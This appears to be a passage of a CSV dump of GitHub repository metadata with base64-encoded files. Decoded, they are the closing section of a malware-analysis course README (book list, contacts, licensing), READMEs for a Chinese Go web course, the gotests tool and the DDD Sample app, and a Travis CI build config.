PWZpbGUpCgpUaGUgZm9sbG93aW5nIGJvb2tzIGFyZSBleGNlbGxlbnQgcmVz
b3VyY2VzIGZvciBleHBhbmRpbmcgeW91ciBrbm93bGVkZ2Ugb2YgbWFsd2Fy
ZSBhbmFseXNpcyBhbmQgcmV2ZXJzZSBlbmdpbmVlcmluZy4gV2UgcmVjb21t
ZW5kIHdvcmtpbmcgdGhyb3VnaCB0aGVtIGluIHRoZSBmb2xsb3dpbmcgb3Jk
ZXI6CgoqIFByYWN0aWNhbCBNYWx3YXJlIEFuYWx5c2lzCiogUHJhY3RpY2Fs
IFJldmVyc2UgRW5naW5lZXJpbmcKKiBSb290a2l0czogU3VidmVydGluZyB0
aGUgV2luZG93cyBLZXJuZWwKKiBUaGUgUm9vdGtpdCBBcnNlbmFsOiBFc2Nh
cGUgYW5kIEV2YXNpb24gaW4gdGhlIERhcmsgQ29ybmVycyBvZiB0aGUgU3lz
dGVtCiogUm9vdGtpdHMgYW5kIEJvb3RraXRzOiBSZXZlcnNpbmcgTW9kZXJu
IE1hbHdhcmUgYW5kIE5leHQgR2VuZXJhdGlvbiBUaHJlYXRzCgpUaGVzZSB0
aHJlZSBib29rcyBhcmUgYWxzbyBleGNlbGxlbnQ6CgoqIFRoZSBBbnRpdmly
dXMgSGFja2VyJ3MgSGFuZGJvb2sKKiBUaGUgQXJ0IG9mIE1lbW9yeSBGb3Jl
bnNpY3MKKiBXaW5kb3dzIEludGVybmFscwoKQW5kIHdoZW4gdGhleSdyZSBo
YXBwZW5pbmcsIHBsYXkgW0NURnNdKGh0dHBzOi8vY3RmdGltZS5vcmcvKSEK
CiMjIyMgPGEgbmFtZT0iY29udGFjdCI+PC9hPkkgaGF2ZSBhIHF1ZXN0aW9u
LCBob3cgY2FuIEkgZ2V0IGluIHRvdWNoIHdpdGggeW91PwpPdXIgY2x1YiBr
ZWVwcyBhIHByZXR0eSBhY3RpdmUgW0lSQ10oaHR0cDovL3JwaXMuZWMvaXJj
KSBwcmVzZW5jZS4gU29tZW9uZSB0aGVyZSBjYW4gcHJvYmFibHkKYW5zd2Vy
IHlvdXIgcXVlc3Rpb24uCgoqKlNlcnZlcjoqKiBgaXJjLnJwaXMuZWNgCioq
UG9ydDoqKiBgNjY2N2AsIG9yIGA2Njk3YCAoU1NMKQoKSWYgeW91IHdvdWxk
IGxpa2UgYSBtb3JlIGZvcm1hbCBtZWFucyBvZiBjb21tdW5pY2F0aW9uLCB5
b3UgY2FuIHJlYWNoIHVzIGF0IGBjb250YWN0IFthdF0gcnBpcy5lY2AKCiMg
TGljZW5zaW5nClRoaXMgY291cnNlIHdhcyBleHBsaWNpdGx5IGRlc2lnbmVk
IGZvciBhY2FkZW1pYyAmIGVkdWNhdGlvbmFsIHVzZSBvbmx5LiBQbGVhc2Ug
a2VlcCB0aGlzCmluIG1pbmQgd2hlbiBzaGFyaW5nIGFuZCBkaXN0cmlidXRp
bmcgb3VyIGNvdXJzZSBtYXRlcmlhbC4gVGhlIHNwZWNpZmljIGxpY2Vuc2Vz
IGludm9sdmVkCmNhbiBiZSBmb3VuZCBiZWxvdy4KCioqTGVjdHVyZSBTbGlk
ZXMqKgoKVGhlIGxlY3R1cmVzIGFyZSBjb3ZlcmVkIGJ5IHRoZSBDcmVhdGl2
ZSBDb21tb25zIEF0dHJpYnV0aW9uLU5vbkNvbW1lcmNpYWwgNC4wCkludGVy
bmF0aW9uYWwgbGljZW5zZSBbQ0MgQlktTkMgNC4wXShodHRwczovL2NyZWF0
aXZlY29tbW9ucy5vcmcvbGljZW5zZXMvYnktbmMvNC4wL2xlZ2FsY29kZSku
CjxwIGFsaWduPSJjZW50ZXIiPgo8YSBocmVmPSJodHRwczovL2NyZWF0aXZl
Y29tbW9ucy5vcmcvbGljZW5zZXMvYnktbmMvNC4wLyI+PGltZyBzcmM9Ii9y
ZXNvdXJjZXMvaW1hZ2VzL2NjLWJ5LW5jLnBuZyIgYWx0PSJDQyBCWS1OQyA0
LjAiLz48L2E+CjwvcD4KCiMgQWNrbm93bGVkZ2VtZW50cwpIdW5kcmVkcyBv
ZiBob3VycyBhbmQgY291bnRsZXNzIGFsbCBuaWdodGVycyB3ZW50IGludG8g
dGhlIHByb2R1Y3Rpb24gYW5kIGV4ZWN1dGlvbiBvZgp0aGlzIGNvdXJzZS4g
VGhpcyBzZWN0aW9uIHNlcnZlcyB0byByZWNvZ25pemUgdGhvc2Ugd2hvIG1h
ZGUgYWxsIG9mIHRoaXMgcG9zc2libGUuCgojIyBPcmlnaW5hbCBBdXRob3Jz
CiAgKiBCcmFuZGVuIENsYXJrCiAgKiBBdXN0aW4gUmFsbHMKICAqIEFhcm9u
IFNlZGxhY2VrCgojIyBTcGVjaWFsIFRoYW5rcwogICogVGhlIFtSUEkgQ1Mg
RGVwYXJ0bWVudF0oaHR0cDovL3d3dy5jcy5ycGkuZWR1LykgZm9yIGdpdmlu
ZyB1cyB0aGlzIG9wcG9ydHVuaXR5IGFuZCBsZXR0aW5nIHVzIHJ1biB3aXRo
IGl0CiAgKiBQcm9mZXNzb3IgQsO8bGVudCBZZW5lciBmb3Igc3BvbnNvcmlu
ZyBzdWNoIGEgY291cnNlCiAgKiBPdXIgc3R1ZGVudHMgd2hvIHB1dCB1cCB3
aXRoIHVzIGFsbCBzZW1lc3Rlcgo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'go-web-foundation',11078351,b'\xe3\x80\x8aGo Web \xe5\x9f\xba\xe7\xa1\x80\xe3\x80\x8b\xe6\x98\xaf\xe4\xb8\x80\xe5\xa5\x97\xe9\x92\x88\xe5\xaf\xb9 Google \xe5\x87\xba\xe5\x93\x81\xe7\x9a\x84 Go \xe8\xaf\xad\xe8\xa8\x80\xe7\x9a\x84\xe8\xa7\x86\xe9\xa2\x91\xe8\xaf\xad\xe9\x9f\xb3\xe6\x95\x99\xe7\xa8\x8b\xef\xbc\x8c\xe4\xb8\xbb\xe8\xa6\x81\xe9\x9d\xa2\xe5\x90\x91\xe5\xae\x8c\xe6\x88\x90\xe3\x80\x8aGo \xe7\xbc\x96\xe7\xa8\x8b\xe5\x9f\xba\xe7\xa1\x80\xe3\x80\x8b\xe6\x95\x99\xe7\xa8\x8b\xe5\x90\x8e\xe5\xb8\x8c\xe6\x9c\x9b\xe8\xbf\x9b\xe4\xb8\x80\xe6\xad\xa5\xe4\xba\x86\xe8\xa7\xa3\xe6\x9c\x89\xe5\x85\xb3 Go Web \xe5\xbc\x80\xe5\x8f\x91\xe7\x9a\x84\xe5\xad\xa6\xe4\xb9\xa0\xe8\x80\x85\xe3\x80\x82',b'Go',1,2383,,2383,False,b'https://api.github.com/repos/unknwon/go-web-foundation/forks',"44CKR28gV2ViIOWfuuehgOOAiwo9PT09PT09PT09PT09PT09PQoKKioyMDE3
IOeJiOe/u+aWsOinhumikeato+WcqOi/nui9veS4re+8jOaCqOWPr+S7pemA
mui/hyBb5q2k6ZO+5o6lXShodHRwczovL2dpdGh1Yi5jb20vVW5rbndvbi9n
by13ZWItZm91bmRhdGlvbi90cmVlL3YxKSDmn6XnnIvml6fniYgqKgoK5oSf
6LCi5omA5pyJ5Zyo56ys5LiA5aWX5pWZ56iLIFvjgIpHbyDnvJbnqIvln7rn
oYDjgItdKGh0dHBzOi8vZ2l0aHViLmNvbS9Vbmtud29uL2dvLWZ1bmRhbWVu
dGFsLXByb2dyYW1taW5nKSDlvZXliLbmnJ/pl7Tnu5nkuojmiJHlpKflipvm
lK/mjIHnmoQgR28g6K+t6KiA54ix5aW96ICF5Lus77yM5piv5L2g5Lus55qE
6byT5Yqx6K6p5oiR5Z2a5oyB5a6M5oiQ6L+Z6aG55byA5rqQ5LqL5Lia44CC
6L+Z5aWX5pWZ56iL5piv5ZCO57ut5pWZ56iL77yM5Y2z5bu656uL5Zyo56ys
5LiA5aWX5Z+656GA5LmL5LiK55qE5pWZ56iL77yM5bey57uP6K6y6Kej6L+H
55qE55u45YWz55+l6K+G54K55bCG5LiN5Lya5YaN6LWY6L+w44CC5Zug5q2k
5aaC5p6c5oKo6L+Y5rKh5pyJ5a6M5oiQ5a2m5Lmg56ys5LiA5aWX5pWZ56iL
77yM6K+35LiN6KaB5pON5LmL6L+H5oCl77yM5Lul5YWN5LqL5YCN5Yqf5Y2K
44CC5LiO56ys5LiA5aWX5LiN5ZCM55qE5piv77yM5pys5aWX5pWZ56iL5bCG
5Lul5pCt5bu65Liq5Lq65Y2a5a6i5L2c5Li65a6e5oiY55uu5qCH77yM55Sx
5rWF6Iez5rex5Zyw6K6y6Kej5L2/55SoIEdvIOW8gOWPkSBXZWIg5bqU55So
56iL5bqP55qE5b+F5aSH55+l6K+G5LiO5oqA5ben44CCCgojIyMg5Z+65pys
5L+h5oGvCgotICoq5pWZ56iL6K6y5biIKirvvJpb5peg6Ze7XShodHRwczov
L2Fib3V0Lm1lL3Vua253b24pCi0gKirmlZnnqIvnroDku4sqKu+8muOAikdv
IFdlYiDln7rnoYDjgIvmmK/kuIDlpZfpkojlr7kgR29vZ2xlIOWHuuWTgeea
hCBHbyDor63oqIDnmoTop4bpopHor63pn7PmlZnnqIvvvIzkuLvopoHpnaLl
kJHlrozmiJDjgIpHbyDnvJbnqIvln7rnoYDjgIvmlZnnqIvlkI7luIzmnJvk
uobop6PmnInlhbMgR28gV2ViIOW8gOWPkeeahOWtpuS5oOiAheOAggotICoq
6K+t6KiA54mI5pysKirvvJpHbyAxLjgueC0xLjEwLngKLSAqKuW8gOWPkeW3
peWFtyoq77yaW1ZTIENvZGVdKGh0dHBzOi8vY29kZS52aXN1YWxzdHVkaW8u
Y29tLykKLSAqKuW8gOWPkeezu+e7nyoq77yabWFjT1MgMTAuMTMuKgotICoq
56ys5LiJ5pa55bqTKirvvJpbTWFjYXJvbl0oaHR0cHM6Ly9naXRodWIuY29t
L2dvLW1hY2Fyb24vbWFjYXJvbinjgIFbZ28tc3FsaXRlM10oaHR0cHM6Ly9n
aXRodWIuY29tL21hdHRuL2dvLXNxbGl0ZTMp44CBW0dPUk1dKGh0dHBzOi8v
Z2l0aHViLmNvbS9qaW56aHUvZ29ybSkKLSAqKuWFtuWug+ivtOaYjioq77ya
5q+P5aCC6K++6YO95Lya5bu656uL5LiA5Liq5paH5Lu25aS577yI5L6L5aaC
77yaYGxlY3R1cmUxYO+8ie+8jOWGheWQq+S4juivvueoi+i/m+W6puebuOes
pueahOmhueebrua6kOeggeS4juivvuWggueslOiusOOAguivvuWggueslOiu
sOS4remHjOmdouWMheWQq+S6huivpeWgguivvuaJgOa2teeblueahOefpeiv
hueCueS7peWPiuefpeivhueCueW8gOWni+iusuino+eahOaXtumXtOeCue+8
jOaWueS+v+WtpuS5oOiAheW/q+mAn+WumuS9jeimgeS6huino+eahOmDqOWI
hu+8jOiKguecgeS4jeW/heimgea1qui0ueeahOaXtumXtOOAguatpOWklu+8
jOWmguaenOaVmeeoi+S4reWboOWPo+ivr+aIluWFtuWug+WOn+WboOS9v+Wt
puS5oOiAheS6p+eUn+i/t+aDkeeahOmDqOWIhu+8jOWQjOagt+S8muWcqOiv
vuWggueslOiusOS4rei/m+ihjOihpeWFheivtOaYjuOAggotICoq5pS25b2V
572R56uZKirvvJoKCS0gW+Wcn+ixhue9kV0oaHR0cDovL3d3dy50dWRvdS5j
b20vcGxjb3Zlci9PbXRwckJKbEx5Zy8pCgktIFvlk5Tlk6nlk5Tlk6ldKGh0
dHBzOi8vd3d3LmJpbGliaWxpLmNvbS92aWRlby9hdjkxOTk2MDMvKQotICoq
6K++56iL5LiL6L29KirvvJoKCS0gW09uZURyaXZlXShodHRwczovLzFkcnYu
bXMvZi9zIUFpMTRqeTBIN1lmVmxDajM0azBleHdVS3VJUkYpCgktIFvnmb7l
uqbnvZHnm5hdKGh0dHBzOi8vZXl1bi5iYWlkdS5jb20vcy8zcExGR1J1cinv
vIjmj5Dlj5bnoIHvvJpgYmV0YWDvvIkKCQojIyMg5pWZ56iL5aSn57qyCgp8
IOivvuaXtuaVsCB8IOivvuaXtuagh+mimCB8IOWcqOe6v+aSreaUviB8Cnw6
LS0tLS06fDotLS0tLS0tLXw6LS0tLS0tLXwKfOesrCAxIOivvnxb5Yid56ql
IEhUVFAg5pyN5Yqh5ZmoXShsZWN0dXJlMSl8W+Wcn+ixhue9kV0oaHR0cDov
L3d3dy50dWRvdS5jb20vcHJvZ3JhbXMvdmlldy8wTXR3emlmS09XNC8pIFtZ
b3VUdWJlXShodHRwczovL3lvdXR1LmJlL1RoOTVzQkwwSDN3KSBbT25lRHJp
dmVdKGh0dHBzOi8vb25lZHJpdmUubGl2ZS5jb20vZW1iZWQ/Y2lkPUQ1ODdF
RDA3MkQ4Rjc4MkQmcmVzaWQ9RDU4N0VEMDcyRDhGNzgyRCUyMTI2MDEmYXV0
aGtleT1BUGNYSUxlaXQ4dTVRMVkpfAp856ysIDIg6K++fFvln7rnoYDmqKHm
nb/nlKjms5VdKGxlY3R1cmUyKXxb5Zyf6LGG572RXShodHRwOi8vd3d3LnR1
ZG91LmNvbS9wcm9ncmFtcy92aWV3L18ycEo5aTI4N3hBLykgW1lvdVR1YmVd
KGh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL3dhdGNoP3Y9NXdNNzRrTDBRZmMp
IFtPbmVEcml2ZV0oaHR0cHM6Ly9vbmVkcml2ZS5saXZlLmNvbS8/YXV0aGtl
eT0lMjFBUGZpVFI3SEJRcTRoRVUmY2lkPUQ1ODdFRDA3MkQ4Rjc4MkQmaWQ9
RDU4N0VEMDcyRDhGNzgyRCUyMTI2MDImcGFySWQ9RDU4N0VEMDcyRDhGNzgy
RCUyMTI2MDAmbz1PbmVVcCl8CnznrKwgMyDor758W+mrmOe6p+aooeadv+eU
qOazlV0obGVjdHVyZTMpfOmihOiuoSAyMDE4IOW5tCAzIOaciHwKfOesrCA0
IOivvnzmnoTlu7rmqKHmnb/nvJPlrZjns7vnu5985b6F5a6afAp856ysIDUg
6K++fOihqOWNleaPkOS6pOS4juWkhOeQhnzlvoXlrpp8CnzlvoXlrpp85Y2a
5a6i6aG555uu6K6+6K6hfOW+heWumnwKfC4uLnwuLi58Li4ufAp85b6F5a6a
fOmDqOe9siBXZWIg56iL5bqPfOW+heWumnwKCiMjIyDnm7jlhbPotYTmupAK
Ci0g5pWZ56iL6LWE5rqQCgkgLSBb44CKR28g57yW56iL5Z+656GA44CLXSho
dHRwczovL2dpdGh1Yi5jb20vVW5rbndvbi9nby1mdW5kYW1lbnRhbC1wcm9n
cmFtbWluZykKCSAtIFvjgIpHbyDlkI3lupPorrLop6PjgItdKGh0dHBzOi8v
Z2l0aHViLmNvbS9Vbmtud29uL2dvLXJvY2stbGlicmFyaWVzLXNob3djYXNl
cykKLSBRUSDkuqTmtYHnvqQKCS0gTWFydGluaSZNYWNhcm9uIOS6pOa1gee+
pO+8mjM3MTQ0MDgwMwoJLSBHbyBXZWIg5Lqk5rWB576k77yaMjU5MzE2MDA0
Ci0g6L6F5Yqp56uZ54K5CgktIFtTb3VyY2VncmFwaF0oaHR0cHM6Ly9zb3Vy
Y2VncmFwaC5jb20vKe+8muacgOW8uiBXZWIg5Luj56CB5rWP6KeI5bel5YW3
CgktIFtHbyBXYWxrZXJdKGh0dHBzOi8vZ293YWxrZXIub3JnKe+8muWcqOe6
vyBHbyDpobnnm64gQVBJIOaWh+ahowoJLSBbR29waGVyIENoYW5uZWxdKGh0
dHBzOi8vdG91dGlhby5pby9zdWJqZWN0cy8xODkyOSnvvJpHbyDor63oqIDl
jZrlrqLlj4rop4bpopHorqLpmIUKCiMjIyDmjojmnYPorrjlj68KCumZpOeJ
ueWIq+WjsOaYjuWklu+8jOacrOWll+aVmeeoi+S4reeahOWGheWuueS9v+eU
qCBDQyBCWS1TQSAzLjAgTGljZW5zZe+8iOWIm+S9nOWFseeUqCDnvbLlkI0t
55u45ZCM5pa55byP5YWx5LqrIDMuMCDorrjlj6/ljY/orq7vvInmjojmnYPv
vIzku6PnoIHpgbXlvqogQlNEIDMtQ2xhdXNlIExpY2Vuc2XvvIgzIOmhuead
oeasvueahCBCU0Qg6K645Y+v5Y2P6K6u77yJ44CCCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'gotests',49927767,b'Generate Go tests from your source code.',b'Go',35,2383,,2383,False,b'https://api.github.com/repos/cweill/gotests/forks',"IyBnb3Rlc3RzIFshW0xpY2Vuc2VdKGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8v
YmFkZ2UvbGljZW5zZS1BcGFjaGUlMjAyLjAtYmx1ZS5zdmcpXShodHRwczov
L2dpdGh1Yi5jb20vY3dlaWxsL2dvdGVzdHMvYmxvYi9tYXN0ZXIvTElDRU5T
RSkgWyFbZ29kb2NdKGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vYmFkZ2UvZ28t
ZG9jdW1lbnRhdGlvbi1ibHVlLnN2ZyldKGh0dHBzOi8vZ29kb2Mub3JnL2dp
dGh1Yi5jb20vY3dlaWxsL2dvdGVzdHMpIFshW0J1aWxkIFN0YXR1c10oaHR0
cHM6Ly90cmF2aXMtY2kub3JnL2N3ZWlsbC9nb3Rlc3RzLnN2Zz9icmFuY2g9
bWFzdGVyKV0oaHR0cHM6Ly90cmF2aXMtY2kub3JnL2N3ZWlsbC9nb3Rlc3Rz
KSBbIVtDb3ZlcmFnZSBTdGF0dXNdKGh0dHBzOi8vY292ZXJhbGxzLmlvL3Jl
cG9zL2dpdGh1Yi9jd2VpbGwvZ290ZXN0cy9iYWRnZS5zdmc/YnJhbmNoPW1h
c3RlcildKGh0dHBzOi8vY292ZXJhbGxzLmlvL2dpdGh1Yi9jd2VpbGwvZ290
ZXN0cz9icmFuY2g9bWFzdGVyKSBbIVtjb2RlYmVhdCBiYWRnZV0oaHR0cHM6
Ly9jb2RlYmVhdC5jby9iYWRnZXMvN2VmMDUyZTMtMzVmZi00Y2FiLTg4Zjkt
ZTEzMzkzYzhhYjM1KV0oaHR0cHM6Ly9jb2RlYmVhdC5jby9wcm9qZWN0cy9n
aXRodWItY29tLWN3ZWlsbC1nb3Rlc3RzKSBbIVtHbyBSZXBvcnQgQ2FyZF0o
aHR0cHM6Ly9nb3JlcG9ydGNhcmQuY29tL2JhZGdlL2dpdGh1Yi5jb20vY3dl
aWxsL2dvdGVzdHMpXShodHRwczovL2dvcmVwb3J0Y2FyZC5jb20vcmVwb3J0
L2dpdGh1Yi5jb20vY3dlaWxsL2dvdGVzdHMpCgpgZ290ZXN0c2AgbWFrZXMg
d3JpdGluZyBHbyB0ZXN0cyBlYXN5LiBJdCdzIGEgR29sYW5nIGNvbW1hbmRs
aW5lIHRvb2wgdGhhdCBnZW5lcmF0ZXMgW3RhYmxlIGRyaXZlbiB0ZXN0c10o
aHR0cHM6Ly9naXRodWIuY29tL2dvbGFuZy9nby93aWtpL1RhYmxlRHJpdmVu
VGVzdHMpIGJhc2VkIG9uIGl0cyB0YXJnZXQgc291cmNlIGZpbGVzJyBmdW5j
dGlvbiBhbmQgbWV0aG9kIHNpZ25hdHVyZXMuIEFueSBuZXcgZGVwZW5kZW5j
aWVzIGluIHRoZSB0ZXN0IGZpbGVzIGFyZSBhdXRvbWF0aWNhbGx5IGltcG9y
dGVkLgoKIyMgRGVtbwoKVGhlIGZvbGxvd2luZyBzaG93cyBgZ290ZXN0c2Ag
aW4gYWN0aW9uIHVzaW5nIHRoZSBbb2ZmaWNpYWwgU3VibGltZSBUZXh0IDMg
cGx1Z2luXShodHRwczovL2dpdGh1Yi5jb20vY3dlaWxsL0dvVGVzdHMtU3Vi
bGltZSkuIFBsdWdpbnMgYWxzbyBleGlzdCBmb3IgW0VtYWNzXShodHRwczov
L2dpdGh1Yi5jb20vZGFtaWVubGV2aW4vR29UZXN0cy1FbWFjcyksIGFsc28g
W0VtYWNzXShodHRwczovL2dpdGh1Yi5jb20vcy1rb3N0eWFldi9nby1nZW4t
dGVzdCksIFtWaW1dKGh0dHBzOi8vZ2l0aHViLmNvbS9idW90by9nb3Rlc3Rz
LXZpbSksIFtBdG9tIEVkaXRvcl0oaHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2Vz
L2dvdGVzdHMpLCBbVmlzdWFsIFN0dWRpbyBDb2RlXShodHRwczovL2dpdGh1
Yi5jb20vTWljcm9zb2Z0L3ZzY29kZS1nbyksIGFuZCBbSW50ZWxsaUogR29s
YW5kXShodHRwczovL3d3dy5qZXRicmFpbnMuY29tL2hlbHAvZ28vcnVuLWRl
YnVnLWNvbmZpZ3VyYXRpb24tZm9yLWdvLXRlc3QuaHRtbCkuCgohW2RlbW9d
KGh0dHBzOi8vZ2l0aHViLmNvbS9jd2VpbGwvR29UZXN0cy1TdWJsaW1lL2Js
b2IvbWFzdGVyL2dvdGVzdHMuZ2lmKQoKIyMgSW5zdGFsbGF0aW9uCgpfX01p
bmltdW0gR28gdmVyc2lvbjpfXyBHbyAxLjYKClVzZSBbYGdvIGdldGBdKGh0
dHBzOi8vZ29sYW5nLm9yZy9jbWQvZ28vI2hkci1Eb3dubG9hZF9hbmRfaW5z
dGFsbF9wYWNrYWdlc19hbmRfZGVwZW5kZW5jaWVzKSB0byBpbnN0YWxsIGFu
ZCB1cGRhdGU6CgpgYGBzaAokIGdvIGdldCAtdSBnaXRodWIuY29tL2N3ZWls
bC9nb3Rlc3RzLy4uLgpgYGAKCiMjIFVzYWdlCgpGcm9tIHRoZSBjb21tYW5k
bGluZSwgYGdvdGVzdHNgIGNhbiBnZW5lcmF0ZSBHbyB0ZXN0cyBmb3Igc3Bl
Y2lmaWMgc291cmNlIGZpbGVzIG9yIGFuIGVudGlyZSBkaXJlY3RvcnkuIEJ5
IGRlZmF1bHQsIGl0IHByaW50cyBpdHMgb3V0cHV0IHRvIGBzdGRvdXRgLgoK
YGBgc2gKJCBnb3Rlc3RzIFtvcHRpb25zXSBQQVRIIC4uLgpgYGAKCkF2YWls
YWJsZSBvcHRpb25zOgoKYGBgCiAgLWFsbCAgICAgICAgICAgICAgICAgIGdl
bmVyYXRlIHRlc3RzIGZvciBhbGwgZnVuY3Rpb25zIGFuZCBtZXRob2RzCgog
IC1leGNsICAgICAgICAgICAgICAgICByZWdleHAuIGdlbmVyYXRlIHRlc3Rz
IGZvciBmdW5jdGlvbnMgYW5kIG1ldGhvZHMgdGhhdCBkb24ndAogICAgICAg
ICAgICAgICAgICAgICAgICAgbWF0Y2guIFRha2VzIHByZWNlZGVuY2Ugb3Zl
ciAtb25seSwgLWV4cG9ydGVkLCBhbmQgLWFsbAoKICAtZXhwb3J0ZWQgICAg
ICAgICAgICAgZ2VuZXJhdGUgdGVzdHMgZm9yIGV4cG9ydGVkIGZ1bmN0aW9u
cyBhbmQgbWV0aG9kcy4gVGFrZXMKICAgICAgICAgICAgICAgICAgICAgICAg
IHByZWNlZGVuY2Ugb3ZlciAtb25seSBhbmQgLWFsbAoKICAtaSAgICAgICAg
ICAgICAgICAgICAgcHJpbnQgdGVzdCBpbnB1dHMgaW4gZXJyb3IgbWVzc2Fn
ZXMKCiAgLW9ubHkgICAgICAgICAgICAgICAgIHJlZ2V4cC4gZ2VuZXJhdGUg
dGVzdHMgZm9yIGZ1bmN0aW9ucyBhbmQgbWV0aG9kcyB0aGF0IG1hdGNoIG9u
bHkuCiAgICAgICAgICAgICAgICAgICAgICAgICBUYWtlcyBwcmVjZWRlbmNl
IG92ZXIgLWFsbAoKICAtbm9zdWJ0ZXN0cyAgICAgICAgICAgZGlzYWJsZSBz
dWJ0ZXN0IGdlbmVyYXRpb24gd2hlbiA+PSBHbyAxLjcKCiAgLXcgICAgICAg
ICAgICAgICAgICAgIHdyaXRlIG91dHB1dCB0byAodGVzdCkgZmlsZXMgaW5z
dGVhZCBvZiBzdGRvdXQKCiAgLXRlbXBsYXRlX2RpciAgICAgICAgIFBhdGgg
dG8gYSBkaXJlY3RvcnkgY29udGFpbmluZyBjdXN0b20gdGVzdCBjb2RlIHRl
bXBsYXRlcy4gVGFrZXMKICAgICAgICAgICAgICAgICAgICAgICAgIHByZWNl
ZGVuY2Ugb3ZlciAtdGVtcGxhdGUKCiAgLXRlbXBsYXRlICAgICAgICAgICAg
IFNwZWNpZnkgY3VzdG9tIHRlc3QgY29kZSB0ZW1wbGF0ZXMsIGUuZy4gdGVz
dGlmeQoKICAtdGVtcGxhdGVfcGFyYW1zX2ZpbGUgcmVhZCBleHRlcm5hbCBw
YXJhbWV0ZXJzIHRvIHRlbXBsYXRlIGJ5IGpzb24gd2l0aCBmaWxlCgogIC10
ZW1wbGF0ZV9wYXJhbXMgICAgICByZWFkIGV4dGVybmFsIHBhcmFtZXRlcnMg
dG8gdGVtcGxhdGUgYnkganNvbiB3aXRoIHN0ZGluCmBgYAoKIyMgQ29udHJp
YnV0aW9ucwoKQ29udHJpYnV0aW5nIGd1aWRlbGluZXMgYXJlIGluIFtDT05U
UklCVVRJTkcubWRdKENPTlRSSUJVVElORy5tZCkuCgojIyBMaWNlbnNlCgpg
Z290ZXN0c2AgaXMgcmVsZWFzZWQgdW5kZXIgdGhlIFtBcGFjaGUgMi4wIExp
Y2Vuc2VdKGh0dHA6Ly93d3cuYXBhY2hlLm9yZy9saWNlbnNlcy9MSUNFTlNF
LTIuMCkuCg==
",,"c3VkbzogcmVxdWlyZWQKbGFuZ3VhZ2U6IGdvCmdvOgogIC0gMS45LngKICAt
IDEuMTAueAogIC0gMS4xMS54CiAgLSAxLjEyLngKYmVmb3JlX2luc3RhbGw6
CiAgLSBnbyBnZXQgZ2l0aHViLmNvbS9tYXR0bi9nb3ZlcmFsbHMKICAtIGlm
ICEgZ28gZ2V0IGdpdGh1Yi5jb20vZ29sYW5nL3Rvb2xzL2NtZC9jb3Zlcjsg
dGhlbiBnbyBnZXQgZ29sYW5nLm9yZy94L3Rvb2xzL2NtZC9jb3ZlcjsgZmkK
c2NyaXB0OgogIC0gZ28gdGVzdCAuLy4uLgogIC0gZ28gdGVzdCAtYyAtY292
ZXJtb2RlPWNvdW50IC1jb3ZlcnBrZz1naXRodWIuY29tL2N3ZWlsbC9nb3Rl
c3RzLGdpdGh1Yi5jb20vY3dlaWxsL2dvdGVzdHMvaW50ZXJuYWwvaW5wdXQs
Z2l0aHViLmNvbS9jd2VpbGwvZ290ZXN0cy9pbnRlcm5hbC9yZW5kZXIsZ2l0
aHViLmNvbS9jd2VpbGwvZ290ZXN0cy9pbnRlcm5hbC9nb3BhcnNlcixnaXRo
dWIuY29tL2N3ZWlsbC9nb3Rlc3RzL2ludGVybmFsL291dHB1dCxnaXRodWIu
Y29tL2N3ZWlsbC9nb3Rlc3RzL2ludGVybmFsL21vZGVscwogIC0gLi9nb3Rl
c3RzLnRlc3QgLXRlc3QuY292ZXJwcm9maWxlIGNvdmVyYWdlLmNvdgogIC0g
JEhPTUUvZ29wYXRoL2Jpbi9nb3ZlcmFsbHMgLXNlcnZpY2U9dHJhdmlzLWNp
IC1jb3ZlcnByb2ZpbGU9Y292ZXJhZ2UuY292Cg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'dddsample-core',30129939,b'This is the new home of the original DDD Sample app (previously hosted at sf.net).. ',b'Java',8,2383,,2383,False,b'https://api.github.com/repos/citerus/dddsample-core/forks',"IyBERERTYW1wbGUKVGhpcyBpcyB0aGUgbmV3IGhvbWUgb2YgdGhlIG9yaWdp
bmFsIERERCBTYW1wbGUgYXBwIGhvc3RlZCBhdCBTb3VyY2VGb3JnZS4gCgpP
dXIgaW50ZW50aW9uIGlzIHRvIG1vdmUgZXZlcnl0aGluZyBmcm9tIFNvdXJj
ZUZvcmdlIHRvIEdpdEh1YiBpbiBkdWUgdGltZSB3aGlsZSBzdGFydGluZyB1
cGdyYWRpbmcgYm90aCB0aGUgdGVjaG5pY2FsIGFzcGVjdHMgYXMgd2VsbCBh
cyB0aGUgREREIGFzcGVjdHMgb2YgdGhlIERERCBTYW1wbGUuCgpUaGUgYXBw
bGljYXRpb24gdXNlcyBTcHJpbmcgQm9vdC4gVG8gc3RhcnQgaXQgZ28gdG8g
dGhlIHJvb3QgZGlyZWN0b3J5IGFuZCB0eXBlIGBtdm4gc3ByaW5nLWJvb3Q6
cnVuYCBvciBydW4gdGhlIGBtYWluYCBtZXRob2Qgb2YgdGhlIGBBcHBsaWNh
dGlvbmAgY2xhc3MgZnJvbSB5b3VyIElERS4gIApUaGVuIG9wZW4gaHR0cDov
L2xvY2FsaG9zdDo4MDgwL2RkZHNhbXBsZSBpbiB5b3VyIGJyb3dzZXIgKGFu
